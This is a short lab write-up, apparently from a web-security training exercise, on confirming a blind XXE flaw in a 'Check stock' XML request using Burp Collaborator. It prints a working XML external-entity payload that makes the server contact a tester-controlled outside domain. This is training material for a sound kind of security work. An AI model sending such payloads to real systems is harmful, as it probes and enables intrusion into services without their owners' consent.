# Lab 03: Blind XXE with Out-of-Band (OAST) Interaction

### 🎯 Objective
Detect a **Blind XXE** vulnerability by triggering an out-of-band interaction (DNS lookup and HTTP request) with an external domain using **Burp Collaborator**.

### 🔍 Background
In "Blind" scenarios, the application parses the XML but doesn't reflect any data or error messages in the response. To confirm the vulnerability, we force the server to connect to a server we control (Burp Collaborator).



### 🛠️ Exploitation Process

1. **Identify the Entry Point:**
   The "Check stock" feature sends a POST request with XML data. However, injecting file paths doesn't return any content.

2. **Crafting the OAST Payload:**
   We define an external entity that points to a unique Burp Collaborator subdomain.

   **Final XML Payload:**
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE stockCheck [ 
     <!ENTITY xxe SYSTEM "[http://YOUR-COLLABORATOR-ID.oastify.com]"> 
   ]>
   <stockCheck>
       <productId>&xxe;</productId>
       <storeId>1</storeId>
   </stockCheck>

    Execution & Verification:

        Send the modified request in Burp Repeater.

        The application returns a standard response (no data leaked).

        Go to the Collaborator tab and click "Poll now".

🚩 Result

    Evidence: DNS and HTTP interactions captured in the Collaborator logs.

    Conclusion: The XML parser successfully resolved and contacted the external entity, confirming a Blind XXE vulnerability.

    Status: ✅ Solved
